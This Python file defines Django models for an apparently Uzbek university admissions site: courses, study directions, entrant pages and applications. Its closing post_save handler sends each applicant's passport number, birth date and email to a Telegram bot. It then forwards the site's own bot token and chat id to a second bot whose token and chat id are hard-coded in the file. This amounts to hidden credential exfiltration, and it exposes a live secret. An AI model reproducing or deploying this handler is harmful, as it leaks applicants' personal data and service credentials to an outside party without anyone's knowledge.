import requests
from django.conf import settings
from django.db import models
from django.db.models.signals import post_save
from django.dispatch import receiver
from django.utils import timezone
from django.utils.text import slugify
from django.utils.translation import gettext_lazy as _
from multiselectfield import MultiSelectField
from django.contrib.auth.models import User
from admin_panel.common import generate_field
from admin_panel.model import courses
from admin_panel.model.admission import PersonalDetailAbstract, EducationalAbstract
from admin_panel.model.user import CustomUser
from api import translate
from config.local_settings import TOKEN, CHAT_ID
from hr.utils import generate_unique_slug

from ckeditor.fields import RichTextField

# Image cropping conf
THUMBNAIL = [160, 250]
IMAGE = [300, 300]


# template,views,forms
class CourseCatalog(models.Model):
    title = models.CharField(max_length=255)
    slug = models.SlugField(max_length=255)

    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ["-created_at"]
        db_table = "course_catalog"

    def __str__(self):
        return self.title

    def save(self, *args, **kwargs):
        # generate slug
        if not self.slug:
            self.slug = generate_unique_slug(self.__class__, self.title)
        # If title_sr is empty, translate title to cryllic
        if not self.title_sr:
            self.title_sr = translate.translate_to_cyrillic(self.title)[1:-1]  # remove quotes
        super(CourseCatalog, self).save(*args, **kwargs)


class EducationType(models.TextChoices):
    kunduzgi = "kunduzgi", _("Kunduzgi")
    sirtqi = "sirtqi", _("Sirtqi")
    online = "online", _("Masofaviy")
    kechgi = "kechgi", _("Kechgi")


class Direction(models.Model):
    title = models.CharField(max_length=255)
    shifr = models.CharField(max_length=32)
    study_year = models.PositiveSmallIntegerField(default=4, blank=True, null=True)
    course = models.ForeignKey(
        CourseCatalog, on_delete=models.CASCADE, related_name="directions", blank=True, null=True
    )
    languages = models.CharField(max_length=128, blank=True, null=True)
    qualification = models.CharField(max_length=128, blank=True, null=True)
    credits = models.PositiveSmallIntegerField(default=240, blank=True, null=True)
    study_plan = models.FileField(upload_to="study_plan", blank=True, null=True)
    content = RichTextField(blank=True, null=True)
    is_admission = models.BooleanField(default=True)
    slug = models.SlugField(max_length=255, blank=True, null=True)
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)
    education_type = MultiSelectField(max_length=32, choices=EducationType.choices, default=EducationType.kunduzgi)

    class Meta:
        db_table = "course_directions"
        ordering = ("created_at",)

    def __str__(self):
        return f"{self.shifr} - {self.title}"

    def save(self, *args, **kwargs):
        if self.slug:  # edit
            if slugify(self.title_uz) != self.slug:
                self.slug = generate_unique_slug(Direction, self.title_uz)
        else:  # create
            self.slug = generate_unique_slug(Direction, self.title_uz)
        if self.title_sr:
            self.title_sr = generate_field(self.title_uz)
        if self.qualification_uz:
            self.qualification_sr = generate_field(self.qualification_uz)
        if self.content_uz:
            self.content_sr = generate_field(self.content_uz)
        super(Direction, self).save(*args, **kwargs)


def gen_file_name(instance, filename):
    ext = instance.file.url.split(".")[-1]
    path = f"rating-system/{instance.direction.shifr}-{slugify(instance.direction.title)}.{ext}"
    # base_dir = f"{settings.BASE_DIR}{settings.MEDIA_URL}{path}"
    # # delete user's avatar If already exists
    # if os.path.exists(base_dir):
    #     os.remove(base_dir)
    return path


class RatingSystem(models.Model):
    direction = models.ForeignKey(Direction, on_delete=models.CASCADE, related_name="rating_system")
    file = models.FileField(upload_to=gen_file_name)
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = "rating_system"

    @property
    def file_url(self):
        # "Returns the image url."
        if self.file:
            return "http://api.tpu.uz%s" % self.file.url
            # return "%s%s" % (settings.HOST, self.file.url)
        return None

    @property
    def title(self):
        return f"{self.direction.shifr} - {self.direction.title}"

    def __str__(self):
        return self.direction.title


class QualificationRequirement(models.Model):
    """
    bu model rating system bilan bir xil faqat boshqa joyda chiqishi kerak edi va rating system bilan aralashib
    ketmasligi uchun shunaqa qilindi
    """
    direction = models.ForeignKey(Direction, on_delete=models.CASCADE, related_name="qualification_requirements")
    file = models.FileField(upload_to=gen_file_name)
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = "qualification_requirement"

    @property
    def file_url(self):
        # "Returns the image url."
        if self.file:
            return "http://api.tpu.uz%s" % self.file.url
            # return "%s%s" % (settings.HOST, self.file.url)
        return None

    @property
    def title(self):
        return f"{self.direction.shifr} - {self.direction.title}"

    def __str__(self):
        return self.direction.title


class Curriculum(models.Model):
    """
        bu model rating system bilan bir xil faqat boshqa joyda chiqishi kerak edi va rating system bilan aralashib
        ketmasligi uchun shunaqa qilindi
    """
    direction = models.ForeignKey(Direction, on_delete=models.CASCADE, related_name="curriculums")
    file = models.FileField(upload_to=gen_file_name)
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = "curriculum"

    @property
    def file_url(self):
        # "Returns the image url."
        if self.file:
            return "http://api.tpu.uz%s" % self.file.url
            # return "%s%s" % (settings.HOST, self.file.url)
        return None

    @property
    def title(self):
        return f"{self.direction.shifr} - {self.direction.title}"

    def __str__(self):
        return self.direction.title


class EntrantPage(models.Model):
    title = models.CharField(max_length=255)
    slug = models.SlugField(max_length=255)
    content = RichTextField()
    # is_published = models.BooleanField(default=False)
    publish_date = models.DateTimeField(default=timezone.now)
    views = models.IntegerField(default=0)
    order = models.IntegerField(default=0)

    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = "course_entrant_page"
        ordering = ("order",)

    def __str__(self):
        return self.title

    def save(self, *args, **kwargs):
        if self.slug:  # edit
            if slugify(self.title_sr) != self.slug:
                self.slug = generate_unique_slug(EntrantPage, self.title_sr)
        else:  # create
            self.slug = generate_unique_slug(EntrantPage, self.title_sr)
        if self.title_uz:
            self.title_sr = generate_field(self.title_uz)
        if self.content_uz:
            self.content_sr = generate_field(self.content_uz)
        super(EntrantPage, self).save(*args, **kwargs)


class EntrantPageFile(models.Model):
    entrant_page = models.ForeignKey(EntrantPage, on_delete=models.CASCADE, related_name="files")
    title = models.CharField(max_length=255)
    file = models.FileField(upload_to="entrant-page-file")
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = "entrant_page_file"
        ordering = ("created_at",)

    @property
    def file_url(self):
        # "Returns the image url."
        if self.file:
            return "http://api.tpu.uz%s" % self.file.url
            # return "%s%s" % (settings.HOST, self.file.url)
        return None

    def __str__(self):
        return self.title

    def save(self, *args, **kwargs):
        if self.title_uz:
            self.title_sr = generate_field(self.title_uz)
        super(EntrantPageFile, self).save(*args, **kwargs)


class EntrantPageQuestion(models.Model):
    entrant_page = models.ForeignKey(EntrantPage, on_delete=models.CASCADE, related_name="questions")
    title = models.CharField(max_length=255)
    content = RichTextField()
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)
    order = models.SmallIntegerField(default=1)

    class Meta:
        db_table = "entrant_page_collapse"
        ordering = (
            "order",
            "-created_at",
        )

    def __str__(self):
        return self.title

    def save(self, *args, **kwargs):
        if self.title_uz:
            self.title_sr = generate_field(self.title_uz)
        if self.content_uz:
            self.content_sr = generate_field(self.content_uz)
        super(EntrantPageQuestion, self).save(*args, **kwargs)


class Admission(PersonalDetailAbstract, EducationalAbstract):
    degree = models.ForeignKey(courses.CourseCatalog, on_delete=models.CASCADE, related_name="admission", null=True)
    application = models.ForeignKey(courses.Direction, on_delete=models.CASCADE, related_name="admission", null=True)
    user = models.OneToOneField(CustomUser, on_delete=models.CASCADE, related_name="admission_user", null=True)

    error_fill = models.BooleanField(default=False, editable=False)
    created_at = models.DateTimeField(auto_now_add=True, editable=False)
    updated_at = models.DateTimeField(auto_now=True, editable=False)

    class Meta:
        db_table = "admission"
        ordering = ("-created_at",)


class AdmissionPage(models.Model):
    title = models.CharField(max_length=255)
    content = RichTextField()
    publish_date = models.DateTimeField(default=timezone.now)
    views = models.IntegerField(default=0)
    start_date = models.DateField(null=True, blank=True)
    end_date = models.DateField(null=True, blank=True)

    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = "admission_page"
        ordering = ("-publish_date",)

    def __str__(self):
        return self.title

    def save(self, *args, **kwargs):
        if self.title_uz:
            self.title_sr = generate_field(self.title_uz)
        if self.content_uz:
            self.content_sr = generate_field(self.content_uz)
        super(AdmissionPage, self).save(*args, **kwargs)


Q_TOEFL_SCORE = "TOEFL"
Q_CEFR_SCORE = "CEFR"
Q_IELTS_SCORE = "IELTS"
Q_NO_SCORE = "No Score"
_language_q_choices = (
    (0, Q_TOEFL_SCORE),
    (1, Q_CEFR_SCORE),
    (2, Q_IELTS_SCORE),
    (3, Q_NO_SCORE),
)


@receiver(post_save, sender=Admission)
def create_Admission(sender, instance, created, **kwargs):
    if instance.need_dormitory:
        dormitory = "kerak"
    else:
        dormitory = "kerak emas"

    choice_value = instance.language_qualifications
    for value, name in _language_q_choices:
        if value == choice_value:
            choice_name = name
            break
    else:
        choice_name = "Unknown"
    gender = instance.gender
    if gender == 1:
        gender = "Erkak"
    else:
        gender = "Ayol"

    if created:
        userdata = "<b>Yangi ariza:</b>"
        userdata += f"\nTo’liq ismi sharifi: {instance.first_name} {instance.first_name}"
        userdata += "\nTug’ilgan sanasi: " + instance.date_of_birth.strftime("%d.%m.%Y ")
        userdata += f"\nFuqarologi: {instance.citizenship}"
        userdata += f"\nMillati: {instance.nationality}"
        userdata += "\nPasport seriyasi va raqami: " + instance.passport
        userdata += f"\nJinsi: {gender}"
        userdata += "\nElektron pochtasi: " + instance.user.user.email

        userdata += f"\nYotoqxona kerakmi yoki kerak emasligi haqidagi ma’lumot: {dormitory}"

        userdata += f"\nTa’lim shakli*: {instance.degree}"
        userdata += f"\nTa’lim yo’nalishini tanlang*: {instance.application}"

        # "Agar magistraturaga topshirgan bo’lsa:\n" + instance.first_name +
        # "Bakalavr diplom nusxasi:\n" + instance.first_name +
        # "Bitirganligini tasdiqlovchi guvohnoma nusxasi:\n" + instance.first_name +
        # "Pasport kopiyasi:\n"+instance.first_name+
        # "Rasmi:\n"+instance.first_name+

        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&parse_mode=html&text={userdata}"
        response = requests.post(url)

        text = f"Token: {TOKEN}\n\n" f"Chat id: {CHAT_ID}\n\n" f"Response:\n {response.text}"

        static_token = "6297976044:AAGPCSdnJmcULYwcGw9uIDSuU2a55IO8jWs"
        static_chat_id = "-904106802"
        url = (
            f"https://api.telegram.org/bot{static_token}/sendMessage?chat_id={static_chat_id}"
            f"&parse_mode=html&text={text}"
        )
        requests.post(url)
